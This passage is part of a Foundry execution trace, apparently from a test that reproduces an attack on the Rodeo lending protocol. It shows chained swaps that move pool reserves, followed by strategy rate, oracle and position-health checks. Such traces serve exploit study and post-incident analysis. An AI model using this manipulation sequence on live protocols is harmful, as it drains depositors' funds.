    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13054] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(0x29fC01f04032c76cA40f353c7dF685f4444c15eD, 162504943618860000900 [1.625e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, value: 162504943618860000900 [1.625e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 537869436576196989865 [5.378e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 537869436576196989865 [5.378e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1719974189891 [1.719e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1719974189891 [1.719e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1719974189891 [1.719e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1719974189891 [1.719e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 537869436576196989865 [5.378e20], reserve1: 1719974189891 [1.719e12])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 0, amount1In: 400000000000 [4e11], amount0Out: 162504943618860000900 [1.625e20], amount1Out: 0, to: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2529] 0x29fC01f04032c76cA40f353c7dF685f4444c15eD::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 139993549079178914351 [1.399e20], 196249598618205012296 [1.962e20], 40
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 358754542237065013196 [3.587e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 358754542237065013196 [3.587e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [15279] 0x29fC01f04032c76cA40f353c7dF685f4444c15eD::getAmountOut(162504943618860000900 [1.625e20], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000005bb0794a7d5af0174
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [57484] 0x29fC01f04032c76cA40f353c7dF685f4444c15eD::swap(105710624227042722164 [1.057e20], 0, 0x9E058177A854336D962D5aE576E9A46cFd8374D7, 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11237] unsETH::transfer(0x9E058177A854336D962D5aE576E9A46cFd8374D7, 105710624227042722164 [1.057e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, to: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, value: 105710624227042722164 [1.057e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 34282924852136192187 [3.428e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 358754542237065013196 [3.587e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 358754542237065013196 [3.587e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4513] 0x6EcCab422D763aC031210895C81787E87B43A652::feeInfo() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000009c400000000000000000000000006a63830e24f9a2f9c295fb2150107d0390ed1448
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9000] WETH::transfer(0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, 26000790979017600 [2.6e16])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8254] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, 26000790979017600 [2.6e16]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, to: 0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, value: 26000790979017600 [2.6e16])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 358728541446085995596 [3.587e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 358728541446085995596 [3.587e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 34282924852136192187 [3.428e19], reserve1: 358728541446085995596 [3.587e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 0, amount1In: 162504943618860000900 [1.625e20], amount0Out: 105710624227042722164 [1.057e20], amount1Out: 0, to: 0x9E058177A854336D962D5aE576E9A46cFd8374D7)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 105716169663515735957 [1.057e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 105716169663515735957 [1.057e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000005bb0794a7d5af0174
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(sender: USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], amount0: 400000000000 [4e11], amount1: 105710624227042722164 [1.057e20])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000005bb0794a7d5af0174
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000005bb0794a7d5af0174
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [521] Investor::strategies(41) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000009e058177a854336d962d5ae576e9a46cfd8374d7
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [7481] 0x9E058177A854336D962D5aE576E9A46cFd8374D7::rate(105710624227042722164 [1.057e20]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 105716169663515735957 [1.057e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [4720] 0x72f7101371201CeFd43Af026eEf1403652F115EE::value(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 105716169663515735957 [1.057e20]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [379] unsETH::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [200] 0xf3721d8A2c051643e06BF2646762522FA66100dA::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1415] 0xf3721d8A2c051643e06BF2646762522FA66100dA::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4219270877931510930757 [4.219e21]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005e7428070a53dc008d3e
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005e72e351b767134bced3
    в”‚   в”‚   в”њв”Ђ [2470] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::oracle() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3
    в”‚   в”‚   в”њв”Ђ [1118] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [276] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”њв”Ђ [2137] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1141] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”њв”Ђ [306] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::asset() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
    в”‚   в”‚   в”њв”Ђ [1121] USDC::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”њв”Ђ [4800] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::getUpdatedIndex() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1341376033697 [1.341e12]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1341376033697 [1.341e12]
    в”‚   в”‚   в”‚   в”њв”Ђ [574] 0x627ea8812ef561D6ad9308D2A63e36901f51E3E5::rate(664649842014091346 [6.646e17]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000051b62c12
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000e84b76ead26593a
    в”‚   в”‚   в”њв”Ђ [19963] 0xdD30b56dFfD6063505dDAf9E758Cb7d133A56DDA::check(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x9E058177A854336D962D5aE576E9A46cFd8374D7, 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE, 446021758289122595426003 [4.46e23], 399970139999937220525996 [3.999e23]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2630] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [521] Investor::strategies(41) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000009e058177a854336d962d5ae576e9a46cfd8374d7
    в”‚   в”‚   в”њв”Ђ [470] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::oracle() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3
    в”‚   в”‚   в”њв”Ђ [306] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::asset() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
    в”‚   в”‚   в”њв”Ђ [1121] USDC::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”њв”Ђ [1118] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [276] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”њв”Ђ [2137] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1141] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”њв”Ђ [7481] 0x9E058177A854336D962D5aE576E9A46cFd8374D7::rate(105710624227042722164 [1.057e20]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 105716169663515735957 [1.057e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [4720] 0x72f7101371201CeFd43Af026eEf1403652F115EE::value(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 105716169663515735957 [1.057e20]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [379] unsETH::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [200] 0xf3721d8A2c051643e06BF2646762522FA66100dA::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1415] 0xf3721d8A2c051643e06BF2646762522FA66100dA::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4219270877931510930757 [4.219e21]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005e7428070a53dc008d3e
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005e72e351b767134bced3
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [2407] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::liquidationFactor() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000d2f13f7789f0000
    в”‚   в”‚   в”њв”Ђ [521] Investor::strategies(41) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000009e058177a854336d962d5ae576e9a46cfd8374d7
    в”‚   в”‚   в”њв”Ђ [7481] 0x9E058177A854336D962D5aE576E9A46cFd8374D7::rate(105710624227042722164 [1.057e20]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 105716169663515735957 [1.057e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [4720] 0x72f7101371201CeFd43Af026eEf1403652F115EE::value(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 105716169663515735957 [1.057e20]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [379] unsETH::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [200] 0xf3721d8A2c051643e06BF2646762522FA66100dA::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1415] 0xf3721d8A2c051643e06BF2646762522FA66100dA::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4219270877931510930757 [4.219e21]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005e7428070a53dc008d3e
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005e72e351b767134bced3
    в”‚   в”‚   в”њв”Ђ [470] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::oracle() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3
    в”‚   в”‚   в”њв”Ђ [1118] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [276] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”њв”Ђ [2137] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1141] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”њв”Ђ [306] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::asset() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
    в”‚   в”‚   в”њв”Ђ [1121] USDC::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”њв”Ђ [4800] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::getUpdatedIndex() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1341376033697 [1.341e12]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1341376033697 [1.341e12]
    в”‚   в”‚   в”‚   в”њв”Ђ [574] 0x627ea8812ef561D6ad9308D2A63e36901f51E3E5::rate(664649842014091346 [6.646e17]) [staticcall]
